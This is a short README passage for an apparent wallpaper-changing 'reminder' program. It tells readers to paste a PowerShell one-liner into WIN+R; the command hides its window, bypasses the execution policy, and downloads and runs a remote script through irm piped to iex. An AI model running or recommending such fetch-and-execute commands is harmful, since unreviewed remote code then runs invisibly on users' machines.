### Run Program instantly from any computer:
Note that no installation nor perquisites are needed, the program leaves no files leftover bar the wallpaper that is currently installed, and that is only left in cache. Restart the device or end the power shell process from task manager to stop the program.

Press WIN+R and paste the setup command:
`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminder.ps1 | iex"`
